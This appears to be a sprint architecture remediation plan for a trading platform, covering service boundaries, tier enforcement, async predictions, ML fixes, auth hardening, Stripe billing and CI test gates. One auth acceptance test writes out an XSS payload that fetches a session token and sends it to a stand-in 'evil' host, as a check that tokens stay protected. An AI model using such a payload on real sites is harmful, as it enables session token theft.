Ultra Plan — Sprint 11 Architecture & Logic Remediation
Branch: fix/sprint11-architecture-remediation
Estimated effort: ~6 weeks (3 two-week sub-sprints)
Source audit: velvet-rolling-gosling.md — 14 logic/architecture issues
Grounding survey: completed — every fix maps to a real file with line numbers

Guiding Principles
Boundary first, features later. Fix data ownership and service boundaries before touching ML or UX — every later fix depends on the contract being right.
No big-bang refactor. Each PBI must ship behind a feature flag or as a backward-compatible migration with shadow-write/dual-read.
Verification gates per phase. Add the test before claiming the fix.
Don't break what works. Sprints 9 & 10 closed 47 fixes — preserve their behavior.
Phase A — Boundary Lockdown (Sprint 11.1, Week 1-2)
Critical foundation. Without this, every later fix is built on sand.

S11-01 — Make market-data internal-only [CRITICAL]
Problem: services/market-data-service/.../SecurityConfig.java:40-42 has anyRequest().permitAll(). Frontend hits /api/v1/prices/** directly via services/web-app/lib/api-client.ts:210-233, bypassing all subscription/rate-limit enforcement.

Solution:

Flip market-data SecurityConfig: require X-Internal-Secret (existing InternalSecretFilter) on all /api/v1/** routes. Keep /actuator/health public.
Remove host port mapping for market-data in docker-compose.yml; expose only on the internal docker network. K8s: keep ClusterIP-only Service (no Ingress rule).
Add services.market-data.url already exists in trading-core (FIX-10) — verify it's consumed in all callers.
Acceptance:

curl http://market-data/api/v1/prices/AAPL/latest from outside the cluster returns 401/403.
Existing trading-core integration tests still pass with X-Internal-Secret injected.
Architecture test (added in S11-14) blocks services/web-app/** from importing market-data URLs.
S11-02 — Move all market-data calls into trading-core [CRITICAL]
Problem: api-client.ts:210-233 calls market-data directly: getLatestPrice, getLatestPrices, getHistoricalPrices, getSymbols, plus the historical-prices used by backtest UI.

Solution:

Add proxy controllers in trading-core:
GET /api/v1/prices/{ticker}/latest (single + batch)
GET /api/v1/prices/{ticker} (historical, paginated)
GET /api/v1/symbols
Each endpoint applies the existing RateLimitFilter (free=5/min, basic=50, premium=500) and reads tier from JWT.
Trading-core delegates to MarketDataServiceAdapter with X-Internal-Secret.
Swap apiClient base URL: drop NEXT_PUBLIC_MARKET_DATA_URL; use single NEXT_PUBLIC_API_BASE_URL → trading-core.
Acceptance:

Frontend has zero references to a market-data hostname (codified in S11-14 dependency test).
Free-tier user gets 429 on the 6th price request inside one minute.
web-app/lib/api-client.ts references only trading-core.
S11-03 — Subscription tier enforcement at every paid endpoint [HIGH]
Problem: velvet-rolling-gosling.md:345 — tiers only enforced in trading-core. Now that everything routes through trading-core (S11-02), enforce per-endpoint, not just rate-limit-per-minute.

Solution:

New annotation @RequireTier(min=Tier.BASIC) resolved by an interceptor reading the JWT plan claim.
Apply to: historical prices (>1y window only for BASIC+), backtest submit, signal-stream subscribe, batch predict.
Persist usage to subscription_usage_ledger table (new — see S11-12 schema work) for billing/audit.
Redis counter for hot path; ledger for durability.
Acceptance:

Free user requesting 5y history → 402 payment_required with { requiredTier: "basic" }.
Ledger row inserted per request; reconciled with Redis counter via nightly cronjob.
New integration test class SubscriptionTierEnforcementIT.
Phase B — Data Ownership & Real-time (Sprint 11.1, Week 2 + 11.2 Week 1)
S11-04 — Symbol ownership: snapshot-on-write [CRITICAL]
Problem: trading_signals.symbol_id (V3 migration) is orphaned — references market_data.symbols which is in another schema. positions.symbol_ticker uses text. Inconsistent, plus violates "no cross-schema joins" rule.

Solution:

Drop symbol_id from trading_signals; keep/normalize ticker VARCHAR(16) (already added in V8).
Add immutable snapshot fields at write time: symbol_name, symbol_exchange, symbol_currency populated by trading-core via internal API call to market-data when the signal is created.
positions already uses symbol_ticker — add same snapshot fields.
Migration V11__symbol_snapshot.sql: backfill snapshots for existing rows via batch script.
Acceptance:

ArchUnit rule: trading_signals schema has no FK to market_data.*.
Backfill script idempotent; re-running produces no diff.
Old symbol_id column dropped after one full release cycle (deprecation flag).
S11-05 — Idempotent prediction API [CRITICAL]
Problem: services/ai-engine/.../prediction.py:31-40 accepts POST /api/v1/predict without request ID. Same client retry produces duplicate inferences (and duplicate billing/usage hits).

Solution:

New table predictions (ai-engine schema): id, request_id UUID UNIQUE, source ENUM('sync','batch','scheduled'), tenant_id, ticker, model_version, status, payload JSONB, result JSONB, created_at, completed_at.
Header Idempotency-Key accepted; if present, response is replayed when seen again.
Sync REST: stores result on first call, returns cached on repeat.
Batch/scheduled: produced via RabbitMQ — see S11-06.
Add idempotency_key to all upstream callers (trading-core).
Acceptance:

Replay test: same request ID twice → identical response, only one DB insert, no model invocation second time.
Clean separation of source field for billing reconciliation.
S11-06 — Async prediction pipeline (RabbitMQ producer/consumer) [CRITICAL]
Problem: velvet-rolling-gosling.md:319 — sync REST and async pipeline mixed without rules. Currently only result queue exists (trading-core.prediction.result.completed per RabbitMQConfig.java:17-54); no request queue.

Solution:

New exchange prediction.request (direct) + queue ai-engine.prediction.requests.
Producer: trading-core scheduler (signal-generation cron) and backtest engine.
Consumer: ai-engine background worker (separate from FastAPI process) reads → looks up by idempotency_key → if not seen, runs inference → publishes to existing prediction.result.completed.
Rule: sync REST = on-demand UI predictions only; RabbitMQ = batch/scheduled. Document in docs/prediction-flow.md.
Acceptance:

Contract test (Spring Cloud Contract or Pact) for prediction-result message schema between ai-engine producer and trading-core consumer.
Idempotency test: same idempotency_key enqueued twice → single inference.
Sync /predict rejected for batch sizes > 50 with Use the async batch endpoint.
S11-07 — Replace web-app RabbitMQ queue with SSE [HIGH]
Problem: velvet-rolling-gosling.md:732 — plan envisions web-app consuming RabbitMQ. Browsers can't, and shouldn't.

Solution:

New endpoint in trading-core: GET /api/v1/signals/stream (SSE), JWT-auth, multitenancy by userId claim.
Trading-core internal listener on signals.created exchange dispatches to per-user in-memory subscriber map (replicate via Redis Pub/Sub for HA).
Frontend uses EventSource with auto-reconnect + last-event-id.
Heartbeat every 25s to defeat proxy timeouts.
Acceptance:

Two browser sessions: signal created for user A only reaches user A's stream.
Connection survives 5-min idle through nginx ingress (heartbeat works).
Memory leak test: 1000 connect/disconnect cycles — heap returns to baseline.
Phase C — ML & Schedule Hardening (Sprint 11.2, Week 2)
S11-08 — ML pipeline correctness pack [HIGH]
Problem: Multiple from velvet-rolling-gosling.md:265, 267 plus survey finding: scaler not persisted with model artifact (training.py:179-181 fits on train-only ✓ but model_registry.py doesn't save scaler).

Solution (split into sub-tasks):

ID	Title	File
S11-08a	Persist scaler+feature schema in artifact	core/services/model_registry.py:245-252
S11-08b	Walk-forward validation in training	adapters/in_/training.py:51-78
S11-08c	Volatility-adjusted labels (k×ATR-based threshold instead of ±1%)	core/domain/label_generator.py:8-9
S11-08d	Cost-aware label: net of round-trip fee+slippage	core/domain/label_generator.py:15-37
S11-08e	Class-weight loss + calibration (isotonic)	core/domain/cnn_model.py
S11-08f	Buy-and-hold + 5-day-mean baselines	new core/services/baseline_evaluator.py
S11-08g	Promotion gate: champion/challenger via active_model_pointer row	model_registry.py + new table
Acceptance:

Data-leakage test: shuffling labels yields ≤ 1% above-random accuracy (proves no leakage).
Scaler reload test: train, save, fresh process loads artifact, predicts on a fixture — bit-equal to in-process inference.
Promotion gate fails when challenger is not statistically better than champion on holdout (Diebold-Mariano test).
S11-09 — Exchange calendar + UTC everywhere [MEDIUM]
Problem: MarketDataIngestionConfig.java cron 0 0 18 ? * MON-FRI zone America/New_York (close enough) but the audit calls out fixed-EST drift. Also vendor finalization delay not modeled.

Solution:

Adopt pandas_market_calendars (Python side) and nyse-calendar (Java side via QuantLib or simple JSON of trading days) — single source of holidays/half-days.
Cron stays at America/New_York but offsets by exchange close + 30 min vendor delay (read from config).
Skip ingestion on closed days; record skip reason in ingestion_runs audit table.
Store all timestamps as TIMESTAMPTZ UTC; convert at presentation layer only.
Acceptance:

Unit test: Thanksgiving 2026 (half-day) — ingestion runs at 13:00 ET + 30 min, not 18:00.
DST transition test: ingestion run on 2026-11-01 (fall-back day) executes once, not twice.
Phase D — Auth, Billing, Schema (Sprint 11.3, Week 1)
S11-10 — Tighten auth/session model [HIGH]
Problem: services/web-app/lib/auth.ts:60-62 parses refresh token from Set-Cookie header — already moved server-side per S10-11 (in development). Survey notes session.accessToken exposed to client (line 99) and CSRF plan unstated. velvet-rolling-gosling.md:421.

Solution:

Verify S10-11 lands first (Next.js route handler proxies refresh cookie).
Stop exposing accessToken in getSession() to client; keep server-side only via auth() helper.
Add CSRF protection for state-changing routes via next-csrf (NextAuth's built-in works for its own routes; custom API routes need explicit double-submit token).
Server-side refresh token: store SHA-256 hash + token family ID in new refresh_token_sessions table (token rotation + replay detection).
Add device_sessions table: user_id, device_fingerprint, last_seen, ip, ua. Logout = revoke session row.
Acceptance:

XSS test: injected <script>fetch('/whoami').then(r=>r.json()).then(d=>fetch('//evil/'+d.token))</script> — captures nothing (token not in JS-accessible storage).
Replay test: stolen old refresh token → entire token family invalidated, user forced to re-login.
CSRF test: form submit from foreign origin → 403.
S11-11 — Billing domain (Stripe) [HIGH]
Problem: velvet-rolling-gosling.md doesn't include billing; tier enforcement (S11-03) needs an entitlement source.

Solution:

New module services/trading-core-service/.../billing/:
Tables: billing_customers (user_id PK, stripe_customer_id), subscriptions (id, customer_id, plan, status, current_period_end, cancel_at), invoices, subscription_events (event_id UNIQUE, type, payload, processed_at).
Webhook endpoint POST /api/v1/billing/webhook with Stripe signature verification.
Webhook idempotency via subscription_events.event_id UNIQUE.
Entitlement cache (Redis, 60s TTL) read by RateLimitFilter and @RequireTier.
Plan catalog (free, basic, premium) seeded via Flyway.
Grace period: subscription.status='past_due' → tier downgrades to free after 3 days.
Acceptance:

Stripe CLI replay of customer.subscription.updated twice → idempotent (one DB row, one entitlement update).
E2E test: payment fails → user downgraded to free after grace window.
S11-12 — Schema hardening pack [MEDIUM]
Problem: Survey table shows trading_signals missing updated_at & user scoping; no soft-delete; no audit columns. velvet-rolling-gosling.md:614.

Solution:

Migration V12__schema_hardening.sql:
trading_signals: add updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW(), user_id UUID (nullable for system-wide signals), created_by VARCHAR(64), indexes on (user_id, created_at DESC).
positions, portfolios, strategies, backtests: add created_by, updated_by, deleted_at TIMESTAMPTZ NULL (soft-delete).
NUMERIC(18,8) standardized for prices, NUMERIC(18,4) for quantities — fix any DOUBLE PRECISION drift.
Unique: (user_id, ticker, generated_at) on trading_signals to prevent dup writes.
New audit_log (id, table_name, row_id, action, actor, before JSONB, after JSONB, at) populated by Postgres triggers.
Hibernate/JPA: @Where(clause = "deleted_at IS NULL") on entities.
Acceptance:

Soft-delete test: deleted portfolio not in list-API but recoverable via admin endpoint.
Audit-log test: position UPDATE → trigger writes before/after row.
All NUMERIC columns documented in docs/db-schema.md with precision rationale.
S11-13 — Secure AI training pipeline [HIGH]
Problem: training.py:38-78 — auth via internal-secret OK, but no resource caps, no GPU isolation, no canary, no rollback.

Solution:

Move training off FastAPI worker — into Celery/RQ queue (separate K8s Deployment with resources.limits.cpu, memory, nvidia.com/gpu: 1).
Job timeout (e.g. 4h max), epoch cap, dataset-size cap — enforced in worker.
Artifact registry: SHA-256 checksum stored alongside model.pt; checksum verified on load.
active_model_pointer table: one row per (model_family, environment); promotion is an atomic UPDATE.
Canary: new model serves 5% traffic for N hours; auto-rollback if calibration drift > threshold.
Admin-only endpoint hardening: require both X-Internal-Secret and Authorization: Bearer with role=admin JWT claim.
Acceptance:

Deploy training worker pod, kill main API — training jobs continue (decoupled).
Promote bad model → canary fails → automated rollback to previous pointer (test scripted).
Phase E — Deployment & Verification (Sprint 11.3, Week 2)
S11-14 — K8s as production source of truth [LOW]
Problem: docker-compose.prod.yml and K8s base both define full app config. Drift inevitable.

Solution:

K8s = production. docker-compose.yml = local dev only (rename old prod compose to docker-compose.staging-only.yml and delete from CI).
Externalize secrets to External Secrets Operator (or sealed-secrets) reading from Vault/AWS SM. Drop committed secrets.yml template entirely.
Generate docs/env-vars.md from a single YAML manifest (infrastructure/config-catalog.yml) consumed by both compose and K8s — single namespace of var names.
CI step: lint compose vs K8s ConfigMap for any var present in one but not the other; fail PR.
Acceptance:

New env var added to catalog, CI fails until both manifests reference it.
kubectl apply from a clean cluster brings up the stack with no manual env input (External Secrets pulls everything).
S11-15 — Verification gate suite [MEDIUM]
Problem: Survey shows 0 architecture tests, 0 contract tests, 0 ML data-leakage tests.

Solution — add as separate test modules, gated in CI:

Gate	Tool	Lives in
Java dep direction (web→core→adapters)	ArchUnit	*/src/test/java/.../arch/
Frontend forbidden imports (no market-data URL)	dependency-cruiser	services/web-app/.dependency-cruiser.cjs
HTTP contract trading-core ↔ market-data	Spring Cloud Contract	services/trading-core-service/src/contractTest/
Message contract trading-core ↔ ai-engine	Pact (JVM + Python)	pacts/ directory + verification jobs
ML data leakage (label-shuffle test)	pytest fixture	services/ai-engine/tests/integration/test_no_leakage.py
Idempotency on RabbitMQ consumers	testcontainers + pytest	services/ai-engine/tests/integration/test_idempotency.py
Auth bypass (every PROTECTED route)	Spring Security tests	services/trading-core-service/src/test/java/.../security/
Subscription limit enforcement	integration test class	same
Migration + index check	Flyway validate + pg_index inspector	services/*/build.gradle ci task
CI gates them all on every PR; merging blocked on red.

Acceptance: Each gate has a committed failing-then-passing example proving it works.

S11-16 — Phase ordering doc [LOW]
Problem: velvet-rolling-gosling.md:470 puts backtest after dashboard; UI depends on contracts that aren't there yet. Already partly remediated (Sprint 8/9), but document the ordering rule for future sprints.

Solution: new docs/phase-ordering.md codifying:

Foundation → auth/subscription boundary → market-data internal API → AI offline training/inference → signal pipeline → frontend → backtest engine → production hardening.

PRs adding new features cite a phase; reviewer verifies ordering is respected.

Risk Register
Risk	Impact	Mitigation
S11-04 backfill fails on bad data	Signals broken	Backfill in shadow column first, verify, then swap
S11-07 SSE behind nginx ingress drops connections	Real-time UX broken	Heartbeat 25s + proxy buffering off + load test
S11-08c volatility labels destabilize model	Worse predictions	Champion/challenger gate (S11-08g) prevents promotion
S11-11 Stripe webhook downtime	Wrong tier in cache	DB ledger replay endpoint; cache TTL is short (60s)
S11-13 GPU node pool not in cluster	Training jobs queue forever	Fallback CPU profile gated by env flag
Suggested Order & PBI Sequence
Week 1: S11-01, S11-02, S11-03            (boundary lockdown)
Week 2: S11-04, S11-05                    (data ownership + idempotency)
Week 3: S11-06, S11-07                    (async pipeline + SSE)
Week 4: S11-08 (a→g), S11-09              (ML + schedule)
Week 5: S11-10, S11-11, S11-12            (auth, billing, schema)
Week 6: S11-13, S11-14, S11-15, S11-16    (training, deploy, gates, docs)
Each PBI ships its own PR. The verification gates from S11-15 are added incrementally as each subject area lands — don't save them all for the end.

What I Did Not Plan (and Why)
Re-implementing AuthN with a different IdP — out of scope; keep NextAuth + JWT, just tighten custody.
Migrating Postgres → CockroachDB — your scaling bottleneck is RabbitMQ throughput and ML training, not OLTP.
GraphQL gateway — REST + SSE is enough for the listed contracts. Adding GQL doubles the surface area.